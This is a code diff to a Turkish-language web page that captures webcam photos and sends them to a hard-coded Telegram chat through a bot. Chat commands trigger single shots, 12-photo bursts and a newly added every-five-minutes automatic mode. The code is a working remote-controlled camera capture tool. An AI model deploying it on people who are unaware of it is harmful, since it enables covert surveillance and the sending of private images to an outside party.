@@ -10,6 +10,7 @@
         .status { margin: 20px; padding: 10px; border-radius: 5px; background: #333; font-size: 14px; }
         .ready { color: #4CAF50; }
         .shooting { color: #E91E63; animation: blink 1s infinite; }
+        .auto { color: #2196F3; }
         @keyframes blink { 50% { opacity: 0.5; } }
     </style>
 </head>
@@ -19,6 +20,7 @@
     <canvas id="canvas" style="display:none;"></canvas>
     <div id="status" class="status">Kamera başlatılıyor...</div>
     <p id="counter" style="font-size: 14px; color: #888;"></p>
+    <p id="auto-status" style="font-size: 14px; color: #2196F3; font-weight: bold;"></p>
     <p style="font-size: 12px; color: #888;">Bu sayfa GitHub üzerinden çalışır ve hiç kapanmaz.</p>
 
     <script>
@@ -26,11 +28,14 @@
         const CHAT_ID = '949655728';
         let lastUpdateId = 0;
         let isProcessing = false;
+        let autoMode = false;
+        let autoInterval = null;
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const statusDiv = document.getElementById('status');
         const counterDiv = document.getElementById('counter');
+        const autoStatusDiv = document.getElementById('auto-status');
 
         async function initCamera() {
             try {
@@ -53,7 +58,7 @@
                     fd.append('photo', b, 'kamera.jpg');
                     if(caption) fd.append('caption', caption);
                     try {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd} );
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}  );
                         resolve(true);
                     } catch(e) { resolve(false); }
                 }, 'image/jpeg', 0.7);
@@ -69,24 +74,52 @@
                 await takeAndSend(`Kare ${i}/12`);
                 if (i < 12) await new Promise(r => setTimeout(r, 5000));
             }
-            statusDiv.innerText = 'Tamamlandı. Dinleniyor...';
-            statusDiv.className = 'status ready';
+            statusDiv.innerText = autoMode ? 'Otomatik Mod Aktif...' : 'Tamamlandı. Dinleniyor...';
+            statusDiv.className = autoMode ? 'status auto' : 'status ready';
             counterDiv.innerText = '';
             isProcessing = false;
+        }
+
+        function toggleAuto(state) {
+            autoMode = state;
+            if (autoMode) {
+                autoStatusDiv.innerText = 'OTOMATİK MOD: AÇIK (5 Dakikada bir)';
+                statusDiv.innerText = 'Otomatik Mod Aktif...';
+                statusDiv.className = 'status auto';
+                takeAndSend("Otomatik Mod Başlatıldı");
+                if (autoInterval) clearInterval(autoInterval);
+                autoInterval = setInterval(() => {
+                    if (!isProcessing) takeAndSend("Otomatik 5 Dakikalık Görüntü");
+                }, 300000); 
+            } else {
+                autoStatusDiv.innerText = '';
+                statusDiv.innerText = 'Sistem Hazır. Bot dinleniyor...';
+                statusDiv.className = 'status ready';
+                if (autoInterval) clearInterval(autoInterval);
+                autoInterval = null;
+            }
         }
 
         async function startPolling() {
             while (true) {
                 try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30` );
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`  );
                     const data = await res.json();
                     if (data.ok && data.result.length > 0) {
                         for (const u of data.result) {
                             lastUpdateId = u.update_id;
-                            if (u.message && u.message.text && !isProcessing) {
+                            if (u.message && u.message.text) {
                                 const t = u.message.text.toUpperCase();
-                                if (t === 'SERI' || t === 'SERİ') startBurst();
-                                else await takeAndSend("Anlık Görüntü");
+                                if (t === 'OTOMATİK AÇ' || t === 'OTOMATIK AC') {
+                                    toggleAuto(true);
+                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Otomatik mod açıldı. Her 5 dakikada bir fotoğraf gönderilecek.` );
+                                } else if (t === 'OTOMATİK KAPAT' || t === 'OTOMATIK KAPAT') {
+                                    toggleAuto(false);
+                                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Otomatik mod kapatıldı.` );
+                                } else if (!isProcessing) {
+                                    if (t === 'SERI' || t === 'SERİ') startBurst();
+                                    else await takeAndSend("Anlık Görüntü");
+                                }
                             }
                         }
                     }
